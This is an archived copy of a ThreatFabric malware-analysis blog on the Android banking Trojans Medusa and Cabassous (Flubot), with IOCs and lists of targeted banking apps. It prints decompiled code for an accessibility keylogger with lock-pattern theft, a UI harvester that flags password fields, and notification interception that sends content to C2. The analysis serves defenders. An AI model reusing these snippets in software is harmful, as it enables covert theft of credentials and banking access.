{
    "id": "df372419-fadb-426d-988a-37061afa7450",
    "created_at": "2023-01-12T15:02:59.116863Z",
    "updated_at": "2025-03-27T02:06:06.350374Z",
    "deleted_at": null,
    "sha1_hash": "fe95e3184fe76cc9b4061f9704d56ce109c8f4a4",
    "title": "2022-02-07 - Medusa- a marriage partner as gunslinger",
    "authors": "",
    "file_creation_date": "2022-05-28T23:40:19Z",
    "file_modification_date": "2022-05-28T23:40:19Z",
    "file_size": 1425798,
    "plain_text": "# Partners-in-crime: Medusa and Cabassous attack banks side-by-side\n\n**threatfabric.com/blogs/partners-in-crime-medusa-cabassous.html**\n\nFebruary 2022\n\n## Medusa: a marriage partner as gunslinger\n\n\n-----\n\nThe success of Cabassous (aka Flubot) distribution campaigns, that have been SMiShing different regions all over\nthe world for almost a year attracted the attention of another threat actor. Just like for Anatsa’s campaigns spotted by\nThreatFabric in May 2020, another powerful mobile banking Trojan, Medusa, is now being distributed through the\nsame SMiShing service as Cabassous.\n\nOur Threat Intelligence shows that Medusa followed Cabassous with exactly the same app names, package names\nand similar icons:\n\nThreatFabric analysts were able to retrieve the number of infected devices for one of the Medusa campaigns. In less\nthen a month, this distribution approach allowed Medusa to reach more then 1500 infected devices in one botnet,\nmasquerading as DHL.\n\nPlease note that Medusa has multiple botnets for every campaign, such as DHL or Flash Player, so we expect the\nnumbers to be much higher and very close to what we are observing with Cabassous. At the time of writing, this sideby-side campaign is still ongoing.\n\nAfter targeting Turkish financial organisations in its first period of activity in 2020, Medusa has now switched its focus\nto North America and Europe, which results in significant number of infected devices. Powered with multiple remote\naccess features, Medusa poses a critical threat to financial organisations in targeted regions.\n\n[At the same time, Cabassous does not seem to have any intention of stopping its evolution. The major update that](https://twitter.com/ThreatFabric/status/1463121699981996032)\nintroduced DNS-tunneling through public DNS-over-HTTPS services has now been followed by a novel capability\nnever seen before in mobile banking malware. In version 5.4 actors are able to abuse the “Notification Direct Reply”\nfeature of Android OS while intercepting notifications, which allows them to manipulate notifications from targeted\napplications on victim’s device.\n\nThis blog covers Medusa banking Trojan new campaigns, gives an overview of Medusa threat actor’s backend\ninfrastructure and describes the new capability of Cabassous and its impact on fraud risk level.\n\n## Medusa: Turkish delight with dangerous filling\n\n[First discovered by ThreatFabric analysts in July 2020, Medusa has undergone several updates of its capabilities.](https://twitter.com/ThreatFabric/status/1285144962695340032)\nAlthough some researchers refer to Medusa as Tanglebot, differentiating them as two separate malware families that\nshare some code similarities, ThreatFabric analysts have been tracking this family from its discovery, and believe that\nthey are indeed the same malware family, which just received several updates and improved in its obfuscation\ntechniques.\n\n\n-----\n\n### Medusa: a deadly gunslinger as wedding partner\n\nThe main threat posed by this Trojan lies in its semi-ATS (Automated Transfer System) capability. It is powered with\nan Accessibility scripting engine that allows actors to perform a set of actions on the victim’s behalf, with the help of\nAndroid Accessibility Service. Moreover, Medusa sports other dangerous features like keylogging, Accessibility event\nlogging, and audio and video streaming - all these capabilities provide actors with almost full access to victim’s\ndevice.\n\nBy abusing Accessibility Services, Medusa is able to execute commands on any app thats is running on victims\ndevice. A command like “fillfocus” allows the malware to set the text value of any specific text box to an arbitrary value\nchosen by the attacker, e.g. the beneficiary of a bank transfer.\n\n\n-----\n\nThanks to the visibility ThreatFabric obtained on the Medusa backend panels, we were able to observe panel\noperator marking banking apps with the “BANK” tag, to control/log the input fields. This means that any banking app\nin the world is at risk to this attack, even those who do not fall within the current target list.\n\n### Keylogger\n\nMedusa authors implemented a simple accessibility-based keylogging, allowing the bot to get access to UI events,\nsuch as clicks, text inputs and focus events of all application on the infected device. This feature allows the actors to\ncollect much more than only user input, as it can also track actions performed on the UI and visualize the content\n\n\n-----\n\nshown in the applications. This enables the attackers to gain further insights into victim s behavior and grants them\nability to steal credentials without having to resort to the use of phishing attacks.\n\nThe code powering the keylogger (including stealing the lock pattern) is visible in following snippet (simplified for\nunderstanding convenience):\n\n\n-----\n\n```\n    y {\n    logTimestamp = new SimpleDateFormat(\"MM/dd/yyyy, HH:mm:ss z\",\nLocale.US).format(Calendar.getInstance().getTime());\n    CharSequence packageName = accessibilityEvent.getPackageName();\n    viewIdResourceName = \"\";\n    logPackageName = packageName == null ? \"\" : accessibilityEvent.getPackageName().toString();\n    worker.stealPattern(v17.getRootInActiveWindow());\n  }\n  catch(Exception unused_ex) {\n  }\n  try {\n    logText = accessibilityEvent.getText().toString();\n    viewIdResourceName = accessibilityEvent.getSource().getViewIdResourceName();\n  }\n  catch(Exception unused_ex) {\n  }\n  String logText = logText;\n  String viewIdResourceName = viewIdResourceName;\n  try {\n    int eventType = accessibilityEvent.getEventType();\n    if(eventType == 1) {\n      logEventType = \"click\";\n    }\n    if(eventType == 8) {\n      logEventType = \"focus\";\n    }\n    if(eventType == 16) {\n      logEventType = \"text\";\n    }\n    if(eventType == 0x2000) {\n      logEventType = \"selchange\";\n    }\n    v17.sendKeylog(logPackageName, logTimestamp, logEventType, logText, viewIdResourceName);\n  }\n  catch(Exception unused_ex) {\n  }\n  ...\n  public void stealPattern(AccessibilityNodeInfo arg13) {\n    String text;\n    if(arg13.getPackageName().equals(\"com.android.systemui\")) {\n      for(Object v0:\narg13.findAccessibilityNodeInfosByViewId(\"com.android.systemui:id/lockPatternView\")) {\n        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo)v0;\n        JSONArray jsonArray = new JSONArray();\n        int index;\n        for(index = 0; index < accessibilityNodeInfo.getChildCount(); ++index) {\n          if(!accessibilityNodeInfo.getChild(index).isClickable()) {\n            JSONObject logAccessibilityNodeInfo = new JSONObject();\n            Rect bounds = new Rect();\n            accessibilityNodeInfo.getChild(index).getBoundsInScreen(bounds);\n            try {\n              text = accessibilityNodeInfo.getChild(index).getText().toString();\n            }\n            catch(Exception unused_ex) {\n              text = \"\";\n            }\n            try {\n              logAccessibilityNodeInfo.put(\"t\", bounds.top);\n              logAccessibilityNodeInfo.put(\"l\", bounds.left);\n              logAccessibilityNodeInfo.put(\"b\", bounds.bottom);\n              logAccessibilityNodeInfo.put(\"r\", bounds.right);\n              logAccessibilityNodeInfo.put(\"k\", text);\n              jsonArray.put(logAccessibilityNodeInfo);\n              }\n\n```\n\n-----\n\n```\n                 ( p _ ) {\n            }\n          }\n        }\n        if(jsonArray.length() <= 0) {\n          continue;\n        }\n        this.sendKeylog(accessibilityNodeInfo.getPackageName().toString(), \"\", \"pattern\",\njsonArray.toString(), \"\");\n      }\n    }\n  }\n\n### Accessibility scripting\n\n```\nAuthors of Medusa also implemented a simple but powerful scripting engine that is able to execute a sequence of\ncommands on the infected device. Combined with the media streaming feature, this provides the attackers with\nlimited but powerful RAT functionalities that allow them to interact with the infected device while monitoring them at\nthe same time.\n\nThe list of available actions is shown hereunder:\n\n**Commands** **Description**\n\nhome_key Performs HOME global action\n\nges Executes a specified gesture on the screen of the device\n\nfid_click Clicks on the UI element with the specified ID\n\nsleep Sleeps (waits) for the specified number of microseconds\n\nrecent_key Shows overview of the recent apps\n\nscrshot_key Performs TAKE_SCREENSHOT global action\n\nnotification_key Opens the active notifications\n\nlock_key Locks the screen\n\nback_key Performs BACK global action\n\ntext_click Clicks on the UI element that has specified text displayed\n\nfill_text Not implemented\n\n### Accessibility events logging\n\nAnother rather powerful feature of Medusa banking trojan is event logging. With a special command from C2 Medusa\nstarts to recursively collect the information about the active window starting from the root node. Information of interest\nis such as but not limited to:\n\nnode bounds in screen coordinates (position of elements in the UI),\ntext of the node (the text inside an element),\nwhether this node is categorized as password (if the element is a field of type “password”)\n\nHaving all the data collected the actor is able to get a better understanding of the interface of different applications\nand therefore implement relevant scenarios for accessibility scripting feature. Moreover, it allows actor(s) to have\ndeeper insight on the applications the victim uses and their typical usage, while also allowing TA(s) to intercept some\nprivate data.\n\n\n-----\n\nThe following snippet shows the code that collects the information of active window going through its nodes:\n```\npublic static JSONObject getInfoAboutNode(AccessibilityNodeInfo node, int arg7) {\n  JSONObject jsonNodeInfo = new JSONObject();\n  if(node == null) {\n    return jsonNodeInfo;\n  }\n  try {\n    ...\n    if(node.getText() != null) {\n      jsonNodeInfo.put(\"t\", node.getText());\n    }\n    if(node.getContentDescription() != null) {\n      jsonNodeInfo.put(\"cd\", node.getText());\n    }\n    if(node.getViewIdResourceName() != null) {\n      jsonNodeInfo.put(\"r\", node.getViewIdResourceName());\n    }\n    ...\n    if(node.isPassword()) {\n      jsonNodeInfo.put(\"pass\", true);\n    }\n    ...\n    if(node.isVisibleToUser()) {\n      jsonNodeInfo.put(\"vis\", true);\n    }\n    if(node.getChildCount() > 0) {\n      JSONArray jsonChildNodeInfo = new JSONArray();\n      int childCounter = 0;\n      while(childCounter < node.getChildCount()) {\n        AccessibilityNodeInfo childNode = node.getChild(childCounter);\n        ++childCounter;\n        jsonChildNodeInfo.put(WorkerAccessibilityService.getInfoAboutNode(childNode, arg7 + 1));\n      }\n      jsonNodeInfo.put(\"chi\", jsonChildNodeInfo);\n    }\n  }\n  catch(Exception unused_ex) {\n  }\n  return jsonNodeInfo;\n}\n\n### Threat actor & backend infrastructure\n\n```\nWe have substantial evidence that indicates that the threat actor behind Medusa are from Turkey. In addition to the\nfact that the actor has spoken Turkish on underground forums, ThreatFabric analysts have collected IP’s, browser\ndetails, and other threat intelligence to corroborate this initial hypothesis.\n\nThe panel used by actors to control Medusa is referred to as Ankatras. ThreatFabric analysts were able to retrieve the\ninformation about FLUDHL campaign, which in only 24 days was able to infect 1784 devices.\n\nMedusa has multiple botnets. The samples seen in side-by-side campaigns with Cabassous are identified by the\nactors themselves with the tags FLUVOICE, FLUFLASH and FLUDHL (possibly as a reference to the corresponding\nCabassous/Flubot campaigns). All these botnets use two separate C2 backends to manage bots. The first is the\nfronting C2, to which bots connect to, while the second is the actual bot operator panel, used by operators to manage\ntheir different botnets.\n\nThe most recent campaigns have more botnet tags as Medusa’s TA seems to have once again switched to another\nregion. The C2s remain the same, while the botnet tags are now “VIDEO”, “CRICKET”, “SIFIRIBNELIK” (translated\nfrom Turkish as “ZERO FAKE”), “PURO”. Based on the application names and masquerade used, we believe these\ncampaigns to target mostly users from USA, Canada and Turkey.\n\n\n-----\n\nOnce again, it is important to note that Medusa is also a very relevant threat for organizations with mobile banking\napps not on the target list, as each victim with this type of malware installed is vulnerable to on-device fraud tactics. In\nfact, it is able the abuse or misuse any input field of any app running on the victims device.\n\n## Cabassous in charge: it will reply for you\n\nIn late January 2022 ThreatFabric analysts discovered new version of Cabassous (Flubot) tagged “5.4”. In this\nversion authors introduced a unique feature: Direct Reply to push notifications. Cabassous is the first banking Trojan\nto utilise Android Nougat Direct Reply feature while intercepting notifications: with this functionality, this malware is\nable to provide C2 supplied responses to notifications of targeted applications on the victim’s device.\n\n\n-----\n\nEvery minute the malware sends the statistics to the C2 about the notifications received. As a response it might\nreceive a template string that will be used to re-create an object of intercepted notification with updated parameters,\nthus allowing Cabassous authors to arbitrarly change notification content. The code snippet below shows the\nimplementation of it in latest Cabassous samples:\n\n\n-----\n\n```\np ( ) {\n  super.onNotificationPosted(sbn);\n  ...\n  String title = sbn.getNotification().extras.getString(\"android.title\");\n  String text = sbn.getNotification().extras.getString(\"android.text\");\n  String packageName = sbn.getPackageName();\n  Long timeout = (Long)p91564b42.notificationsTimeLogger.get(packageName);\n  ...\n  if(v2 != null && (p91564b42.notifResponse != null && !p91564b42.notifResponse.isEmpty())) {\n    try {\n      if(((long)timeout) == 0L) {\n        p91564b42.notificationsTimeLogger.put(packageName,\nLong.valueOf(System.currentTimeMillis()));\n        Integer sent2package = (Integer)p91564b42.notificationsCounter.get(packageName);\n        if(sent2package == null) {\n          sent2package = (int)0;\n        }\n        p91564b42.notificationsCounter.put(packageName, Integer.valueOf(((int)sent2package) + 1));\n        String appName = pd8474166.getAppName(this, packageName);\n        String v8 = p91564b42.notifResponse.replaceAll(\"%APP%\", appName);\n        p91564b42.notifResponse = v8;\n        String v8_1 = v8.replaceAll(\"%TITLE%\", title);\n        p91564b42.notifResponse = v8_1;\n        p91564b42.notifResponse = v8_1.replaceAll(\"%TEXT%\", text);\n        v2.f(this.getApplicationContext(), p91564b42.notifResponse);\n      }\n      else if(System.currentTimeMillis() - ((long)timeout) > 2000L) {\n        p91564b42.notificationsTimeLogger.put(packageName, Long.valueOf(0L));\n      }\n    }\n    catch(PendingIntent.CanceledException v1) {\n    }\n  }\n  if(p7e1b9eb1.isInterceptingNotif()) {\n    p53cba4f5.sendToC2(\"LOG,NOTIF,\" + title + \": \" + text, Boolean.valueOf(true));\n    this.cancelNotification(sbn.getKey());\n  }\n}\n\n```\nWe believe that this previously unseen capability can be used by actors to sign fraudulent transactions on victim’s\nbehalf, thus making notifications non-reliable authentication/authorization factor on an infected device.\nAnother potential abuse of this functionality could be to respond to social applications notifications with malicious\nphishing links. Considering the popularity of these type of apps and the strong focus of Cabassous’ TA on distribution\ntactics, this could easily be the main MO behind this new Notification Direct Reply Abuse.\n\n## Conclusion\n\nMore and more actors follow Cabassous’ success in distribution tactics, appropriating masquerading techniques and\nusing the same distribution service. Despite the fact that Medusa is not extremely widespread at the moment, we do\nsee an increase in volume of campaigns and a sufficiently greater number of different campaigns.\n\nAt the same time, Cabassous keeps evolving, introducing new features and making another step towards being able\nto perform on-device fraud. This innovative feature (for banking malware) provides Cabassous’ actors with improved\ncontrol over intercepted notifications.\n\nThe evolution of malware families show that 2FA techniques might be not sufficient to ensure origin of transaction. It\nrequires deeper TI in combination with a solution that is able to detect malicious behaviour on customers devices.\n\n## How we help our customers\n\n\n-----\n\nThreatFabric makes it easier than it has ever been to run a secure mobile payments business. With the most\nadvanced threat intelligence for mobile banking, financial institutions can build a risk-based mobile security strategy\nand use this unique knowledge to detect fraud-by-malware on the mobile devices of customers in real-time.\n\nTogether with our customers and partners, we are building an easy-to-access information system to tackle the ever\ngrowing threat of mobile malware targeting the financial sector. We especially like to thank the Cyber Defence\nAlliance (CDA) and FS-ISAC for collaborating and proactively sharing knowledge and information across the financial\nsector to fight cyber-threats.\n\nThreatFabric has partnerships with TIPs all over the world.\n\nIf you want to request a free trial of our MTI-feed, or want to test our own MTI portal for 30 days, feel free to contact\nus at: [sales@threatfabric.com](http://10.10.0.46/mailto://sales@threatfabric.com)\n\nIf you want more information on how we detect mobile malware on mobile devices, you can directly contact us at:\n[info@threatfabric.com](http://10.10.0.46/mailto://info@threatfabric.com)\n\n## Appendix: IOC\n\n### Medusa Samples\n\n**App**\n**name** **Package name** **SHA-256**\n\n\nVideo\nPlayer\n\n\ncom.xwlbouply.dbhxzcsgw fe3d38316dc38a4ec63eac80e34cb157c9d896460f9b7b3bfbd2cec4e2cb8cdc\n\n\nDHL com.iqiyi.i18n d83a06d5a41dd56b6cd3e9c3afef850ab07f176ae8f005759edb242daf7b9f38\n\nVoicemail com.qq.reader e2db34355df77e3c95e291a1374e4ba6a75d0da471ab9f929b9ef3424f824421\n\n\nFlash\nPlayer\n\nAmazon\nLocker\n\n\ncom.thestore.main 75f1bebe19feba3914a7bbf95a8ce742cb709658c2105cf2ebe8cf7ef0c43f23\n\ncom.autonavi.minimap b259fa47fc27728675a2629b98fbe4bb73c0b2216797a154f58c85f7578b3f4d\n\n\n### Medusa C2\n\n**C2**\n\nessesessssssss.top\n\nsock.essesessssssss.top:20027\n\nnmnmnmfsamsfan.xyz\n\nsock.nmnmnmfsamsfan.xyz:20027\n\nunknknknnkknkknnk.xyz\n\nsock.unknknknnkknkknnk.xyz:20027\n\npembesir.xyz\n\nsock.pembesir.xyz:20027\n\nasfsafsakjfkjsa.xyz\n\nsock.asfsafsakjfkjsa.xyz:20027\n\n\n-----\n\n### Cabassous (Flubot) Samples\n\n**App**\n**name** **Package name** **SHA-256**\n\nDHL com.tencent.mobileqq df98a8b9f15f4c70505d7c8e0c74b12ea708c084fbbffd5c38424481ae37976f\n\n\nFlash\nPlayer\n\nAmazon\nLocker\n\n\ncom.tencent.mobileqq 2213a4d0a8d3752ce6edde18c2562478dc73c2c618842ca7b158282a0e525972\n\ncom.autonavi.minimap b2dafc4faea81f4addf1ac3a295627e9f7e1d36efa2a8b82a813d853cfcf87c4\n\n\nVoicemail com.qiyi.video a685fbeedd05341f0da64b774142c48ba68193a2a68fa42b3341038c26057e7c\n\n### Cabassous C2\n\n**Domain**\n\nfpuacswjcgpcxoe[.]ru\n\nueihtnoujbedjiu[.]ru\n\numxkexskgtctvws[.]cn\n\n## Appendix: Targeted apps\n\n### Medusa.B Targets for Flu botnet tags\n\nPlease note that target differ per botnet, Flu botnet tag focus is US, ES, TR Medusa has its own tags for Canada,\nwhich contain Canadian banks as target.\n\n**Package Name** **App Name**\n\n\n-----\n\n**Package Name** **App Name**\n\ncom.tecnocom.cajalaboral Banca Móvil Laboral Kutxa\n\ncom.woodforest Woodforest Mobile Banking\n\ncom.teb CEPTETEB\n\ncom.suntrust.mobilebanking SunTrust Mobile App\n\nes.univia.unicajamovil UnicajaMovil\n\nes.cm.android Bankia\n\ncom.ally.MobileBanking Ally Mobile\n\ncom.tmobtech.halkbank Halkbank Mobil\n\ncom.imaginbank.app imaginBank - Your mobile bank\n\nfinansbank.enpara Enpara.com Cep Şubesi\n\ncom.finansbank.mobile.cepsube QNB Finansbank Mobile Banking\n\ncom.tdbank TD Bank (US)\n\nes.evobanco.bancamovil EVO Banco móvil\n\nes.liberbank.cajasturapp Banca Digital Liberbank\n\ncom.schwab.mobile Schwab Mobile\n\nwww.ingdirect.nativeframe ING España. Banca Móvil\n\ncom.pozitron.iscep İşCep - Mobile Banking\n\ncom.ziraat.ziraatmobil Ziraat Mobile\n\ncom.citi.citimobile Citi Mobile®\n\nes.openbank.mobile Openbank – banca móvil\n\nbu.bir.test.uygulamasi _TA testing app_\n\ncom.citizensbank.androidapp Citizens Bank Mobile Banking\n\ncom.kuveytturk.mobil Kuveyt Türk\n\ncom.clairmail.fth Fifth Third Mobile Banking\n\ncom.rsi ruralvía\n\nes.ibercaja.ibercajaapp Ibercaja\n\ncom.bankinter.empresas Bankinter Empresas\n\ncom.botw.mobilebanking Bank of the West Mobile\n\ncom.denizbank.mobildeniz MobilDeniz\n\ncom.magiclick.odeabank Odeabank\n\norg.ncsecu.mobile SECU\n\ncom.infonow.bofa Bank of America Mobile Banking\n\n\n-----\n\n**Package Name** **App Name**\n\ncom.mcom.firstcitizens First Citizens Mobile Banking\n\ncom.bmoharris.digital BMO Digital Banking\n\ncom.zellepay.zelle Zelle\n\ncom.vakifbank.mobile VakıfBank Mobil Bankacılık\n\ncom.compasssavingsbank.mobile Compass Savings Bank\n\ncom.ykb.android Yapı Kredi Mobile\n\ncom.morganstanley.clientmobile.prod Morgan Stanley Wealth Mgmt\n\ncom.wf.wellsfargomobile Wells Fargo Mobile\n\ncom.mfoundry.mb.android.mb_136 People’s United Bank Mobile\n\ntr.com.hsbc.hsbcturkey.uk HSBC Turkiye\n\ncom.grupocajamar.wefferent Grupo Cajamar\n\nes.bancosantander.apps Santander\n\ncom.key.android KeyBank Mobile\n\ncom.navyfederal.android Navy Federal Credit Union\n\ncom.mtb.mbanking.sc.retail.prod M&T Mobile Banking\n\ncom.etrade.mobilepro.activity E*TRADE: Invest. Trade. Save.\n\ncom.akbank.android.apps.akbank_direkt Akbank\n\ncom.usaa.mobile.android.usaa USAA Mobile\n\ncom.pnc.ecommerce.mobile PNC Mobile\n\ncom.garanti.cepsubesi Garanti BBVA Mobile\n\ncom.americanexpress.android.acctsvcs.us Amex\n\ncom.ziraatkatilim.mobilebanking Katılım Mobil\n\ncom.bankinter.launcher Bankinter Móvil\n\ncom.discoverfinancial.mobile Discover Mobile\n\ncom.konylabs.capitalone Capital One® Mobile\n\ncom.bbva.bbvacontigo BBVA Spain\n\ncom.kutxabank.android Kutxabank\n\nes.lacaixa.mobile.android.newwapicon CaixaBank\n\n### Cabassous.D Targets\n\n**Package Name** **App Name**\n\nau.com.cua.mb CUA Mobile Banking\n\n\n-----\n\n**Package Name** **App Name**\n\nau.com.bankwest.mobile Bankwest\n\nco.zip Zip - Shop Now, Pay Later\n\norg.bom.bank Bank of Melbourne Mobile Banking\n\nuk.co.tescomobile.android Tesco Mobile\n\ncom.bankofqueensland.boq BOQ Mobile\n\nuk.co.tsb.newmobilebank TSB Mobile Banking\n\ncom.coinbase.android Coinbase – Buy & Sell Bitcoin. Crypto Wallet\n\norg.stgeorge.bank St.George Mobile Banking\n\nuk.co.mbna.cardservices.android MBNA - Card Services App\n\nuk.co.santander.santanderUK Santander Mobile Banking\n\ncom.adcb.bank ADCB\n\ncom.grppl.android.shell.BOS Bank of Scotland Mobile Banking: secure on the go\n\nuk.co.hsbc.hsbcukmobilebanking HSBC UK Mobile Banking\n\nau.com.suncorp.SuncorpBank Suncorp Bank\n\nau.com.macquarie.banking Macquarie Mobile Banking\n\ncom.binance.dev Binance - Buy & Sell Bitcoin Securely\n\ncom.barclays.android.barclaysmobilebanking Barclays\n\ncom.cbd.mobile CBD\n\ncom.fusion.banking Bank Australia app\n\ncom.grppl.android.shell.CMBlloydsTSB73 Lloyds Bank Mobile Banking: by your side\n\ncom.vipera.ts.starter.MashreqAE Mashreq UAE\n\norg.banksa.bank BankSA Mobile Banking\n\norg.banking.bom.businessconnect Bank of Melbourne Business App\n\nau.com.newcastlepermanent NPBS Mobile Banking\n\ncom.fusion.beyondbank Beyond Bank Australia\n\nau.com.nab.mobile NAB Mobile Banking\n\ncom.rbs.mobile.android.natwest NatWest Mobile Banking\n\ncom.commbank.netbank CommBank\n\ncom.anz.android.gomoney ANZ Australia\n\norg.banking.stg.businessconnect St.George Business App\n\ncom.virginmoney.cards Virgin Money Credit Card\n\nau.com.amp.myportfolio.android My AMP\n\n\n-----\n\n**Package Name** **App Name**\n\nau.com.mebank.banking ME Bank\n\nenbd.mobilebanking Emirates NBD\n\ncom.cooperativebank.bank The Co-operative Bank\n\norg.westpac.bank Westpac Mobile Banking\n\ncom.rbs.mobile.android.rbs Royal Bank of Scotland Mobile Banking\n\nnz.co.kiwibank.mobile Kiwibank Mobile Banking\n\ntsb.mobilebanking TSB Bank Mobile Banking\n\nco.uk.Nationwide.Mobile Nationwide Banking App\n\nau.com.rams.RAMS myRAMS\n\norg.westpac.col Westpac Corporate Mobile\n\ncom.grppl.android.shell.halifax Halifax: the banking app that gives you extra\n\nnz.co.asb.asbmobile ASB Mobile Banking\n\nau.com.commbank.commbiz.prod CommBiz\n\ncom.bendigobank.mobile Bendigo Bank\n\norg.banking.bsa.businessconnect BankSA Business App\n\ncom.nearform.ptsb permanent tsb\n\ncom.greater.Greater Greater Bank\n\nnz.co.anz.android.mobilebanking ANZ goMoney New Zealand\n\nuk.co.metrobankonline.mobile.android.production Metro Bank\n\nau.com.ubank.internetbanking UBank Mobile Banking\n\ncom.anz.transactive.global ANZ Transactive - Global\n\nau.com.hsbc.hsbcaustralia HSBC Australia\n\nnz.co.westpac Westpac One (NZ) Mobile Banking\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-07 - Medusa- a marriage partner as gunslinger.pdf"
    ],
    "report_names": [
        "2022-02-07 - Medusa- a marriage partner as gunslinger.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535779,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1653781219,
    "ts_modification_date": 1653781219,
    "files": {
        "pdf": "https://archive.orkl.eu/fe95e3184fe76cc9b4061f9704d56ce109c8f4a4.pdf",
        "text": "https://archive.orkl.eu/fe95e3184fe76cc9b4061f9704d56ce109c8f4a4.txt",
        "img": "https://archive.orkl.eu/fe95e3184fe76cc9b4061f9704d56ce109c8f4a4.jpg"
    }
}